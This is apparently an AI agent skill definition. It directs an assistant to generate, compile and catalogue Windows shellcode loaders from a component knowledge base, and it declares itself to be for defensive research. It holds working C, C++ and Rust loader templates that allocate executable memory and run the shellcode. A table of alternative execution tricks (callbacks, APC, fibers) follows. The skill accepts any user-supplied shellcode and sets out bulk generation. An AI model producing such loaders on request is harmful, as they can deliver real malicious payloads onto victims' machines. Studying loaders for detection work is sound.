---
name: loader_generate
description: Generate shellcode loaders by combining components from the knowledge base. Creates working C/C++/Rust loader code using documented techniques. Use this skill when the user wants to "generate loader", "create shellcode loader", "build loader", "批量生成", or create loaders from knowledge base. Triggers on phrases like "loader", "shellcode loader", "generate", "create loader".
version: 2.0.0
---

# Loader Generate Skill

Generate shellcode loaders by combining components from the loader knowledge base for defensive security research.

## Authorization Context

**AUTHORIZED USE CASE: Defensive Security Research**

This skill is used for:
- Understanding attacker techniques to improve detection capabilities
- Developing security product testing methodologies
- Red team / blue team training exercises
- Security product evaluation and improvement

## When to Use This Skill

- User asks to generate or create a shellcode loader
- User wants to combine specific techniques
- User says "loader", "shellcode loader", "generate"
- User mentions allocation methods, execution methods

## Workflow

### Step 1: Query Knowledge Base

List available components:

```bash
# Get all components
python lib/knowledge_manager.py get-components

# Get specific type
python lib/knowledge_manager.py get-components --type allocators
python lib/knowledge_manager.py get-components --type executors
python lib/knowledge_manager.py get-components --type copiers
```

### Step 2: Check Existing Scenarios

Avoid duplicates:

```bash
python lib/knowledge_manager.py list-scenarios
```

### Step 3: Select or Random Combination

```bash
# Random combination
python lib/knowledge_manager.py random-combination

# Filter by complexity
python lib/knowledge_manager.py random-combination --complexity simple
```

### Step 4: Generate Code

Load shellcode from specified file or default to `samples/calc.bin`.

#### Shellcode File Resolution

```
--shellcode <path>    → Use specified file
<file.bin>            → Treat as shellcode file (shorthand)
No argument           → Use samples/calc.bin
```

#### Validate Shellcode File

```bash
# Check file exists
if [ ! -f "$SHELLCODE_FILE" ]; then
    echo "Error: Shellcode file not found: $SHELLCODE_FILE"
    exit 1
fi

# Check file size
SIZE=$(stat -c%s "$SHELLCODE_FILE")
echo "Shellcode size: $SIZE bytes"
```

#### Embed Shellcode into Code

#### C Template

```c
#include <windows.h>

unsigned char shellcode[] = { /* calc.bin bytes */ };

int main() {
    // ALLOCATOR: VirtualAlloc
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // COPIER: memcpy
    memcpy(addr, shellcode, sizeof(shellcode));

    // EXECUTOR: function pointer
    ((void(*)())addr)();

    return 0;
}
```

#### C++ Template

```cpp
#include <windows.h>
#include <vector>

class Loader {
public:
    bool execute(const std::vector<uint8_t>& shellcode) {
        LPVOID addr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!addr) return false;
        memcpy(addr, shellcode.data(), shellcode.size());
        ((void(*)())addr)();
        return true;
    }
};

int main() {
    std::vector<uint8_t> shellcode = { /* calc.bin bytes */ };
    Loader loader;
    loader.execute(shellcode);
    return 0;
}
```

#### Rust Template

```rust
use windows::Win32::System::Memory::*;

fn main() {
    let shellcode: Vec<u8> = vec![/* calc.bin bytes */];

    unsafe {
        let addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            addr as *mut u8,
            shellcode.len(),
        );

        let func: extern "C" fn() = std::mem::transmute(addr);
        func();
    }
}
```

### Step 5: Compile

```bash
# C
x86_64-w64-mingw32-gcc -o output/loader.exe output/loader.c

# C++
x86_64-w64-mingw32-g++ -o output/loader.exe output/loader.cpp

# Rust
cargo build --release --target x86_64-pc-windows-gnu
```

### Step 6: Record Result

```bash
python lib/knowledge_manager.py add-scenario \
  --name "Loader Name" \
  --storage embedded \
  --allocator VirtualAlloc \
  --copier memcpy \
  --executor callback \
  --status validated

python lib/knowledge_manager.py add-loader-technique \
  --storage embedded \
  --allocator VirtualAlloc \
  --copier memcpy \
  --executor callback
```

## Component Templates

### Allocators

| Method | Template | Complexity |
|--------|----------|------------|
| VirtualAlloc | `VirtualAlloc(NULL, size, MEM_COMMIT \| MEM_RESERVE, PAGE_EXECUTE_READWRITE)` | simple |
| HeapCreate | `HANDLE h = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); HeapAlloc(h, 0, size)` | medium |
| NtAllocateVirtualMemory | `NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size, MEM_COMMIT \| MEM_RESERVE, PAGE_EXECUTE_READWRITE)` | complex |

### Executors

| Method | Template | Complexity |
|--------|----------|------------|
| Function Pointer | `((void(*)())addr)()` | simple |
| CreateThread | `CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL)` | simple |
| Callback (EnumWindows) | `EnumWindows((WNDENUMPROC)addr, NULL)` | medium |
| APC | `QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), 0); SleepEx(0, TRUE)` | medium |
| Fiber | `ConvertThreadToFiber(NULL); LPVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL); SwitchToFiber(f)` | complex |

## Important Rules

1. **ALWAYS** check `scenarios.json` before generating to avoid duplicates
2. **ACCEPT** user-provided shellcode files via `--shellcode` argument or positional `.bin` argument
3. **DEFAULT** to `samples/calc.bin` when no shellcode specified
4. **ALWAYS** record generated combinations to knowledge base (include shellcode path)
5. **NEVER** run or test the generated executables - compilation success is sufficient
6. Use absolute paths for Python commands

## Output Format

After generation, provide:
1. Technique combination used
2. Source code file path
3. Compilation result (success/fail)
4. Knowledge base record ID
